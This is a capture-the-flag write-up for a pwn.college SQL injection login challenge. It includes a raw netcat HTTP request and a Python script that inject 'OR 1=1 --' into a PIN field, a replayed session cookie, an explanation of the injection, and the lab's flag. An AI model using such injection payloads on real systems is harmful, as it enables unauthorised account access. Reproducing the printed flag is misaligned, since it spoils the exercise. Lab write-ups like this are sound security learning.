# challenge: SQLi 1

üìÖ 2026-02-15
üìÅ web security

---

## ‚úÖ what i did  
I WAY -> netcat
-clicked start
-opened the terminal
-ran: 'cat /challenge/server'
table=users, columns=username, pin
admin - random number
guest - 1337
endpoint: /credentials
POST-> login-name & pin
sqlite execute the following query: SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }
-ran: '/challenge/localhost'
-ran: 'nc -v challenge.localhost 80'
-typed: 'POST /credentials HTTP/1.1'
        'Host: challenge.localhost'
        'Content-Type: application/x-www-form-urlencoded'
        'Content-Length: 32'
        ''
        'login-name=admin&pin=1 OR 1=1 --'
-output: 302 FOUND
-copied the Set-Cookie value
-ran: 'nc -v challenge.localhost 80'
-typed: 'GET /credentials HTTP/1.1'
        'Host: challenge.localhost'
        'Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aZI9oA.ZFlKAAyE2LKIXQBH_g-7c6_PAVE'
-flag popped out

II WAY -> python
-clicked start
-opened the terminal
-ran: 'vim bro'
-typed:         '#!/usr/bin/env python3'
                'import requests'
                'from pwn import *'
                'context.log_level = 'error''
                'url = "http://challenge.localhost:80/credentials"'
                'p = process("/challenge/server")'
                'time.sleep(1)'
                'data = {'
                        '"login-name" : "admin",'
                        '"pin" : "1 OR 1=1 --"'
                        '}'
                'r = requests.post(url, data=data)'
                'print(r.text)'
-ran: 'chmod a+x bro'
-ran: './bro'
-flag popped out

## üßëüèæ‚Äçüè´ what this challenge teaches u
how to perform a basic SQLi
in this case u just need to add OR 1=1 -- in the pin field
  1-to inject the payload, pin field is our target and not login-name because the session cookie builds from the server, is based on username. this means username=admin
  2-pin number is impossible to guess but lookin at the query, the structure is vulnerable and we can inject our payload
  3-the statement OR 1=1 is always TRUE and this will make the query execute because it didnt fail
  4-the order of query checking conditions is: NOT -> AND -> OR. in this case it will do this:
    (username=admin AND pin=1) OR 1=1 --
    pin is wrong making the first condition FALSE but 1=1 makes it TRUE thanks to the OR
  5- to escape the last ' use -- to comment it out
once got the cookie session, u just need to make a GET request including the cookie
on python when u perform a post requests, inside parentheses data stands for body
ultimately python allows redirects by default. this means u just need to perform one single request to get the flag
because is stores automatically the cookie session and sends it in the next requests due to allow_redirects=True
to disable this, in the post requests write: allow_redirects=False

## üèÅ Flag  
pwn.college{QHe9pXvG8ZE2VlPbpMZo8LObeKn.QXzcTN2wCO4IDOxEzW}
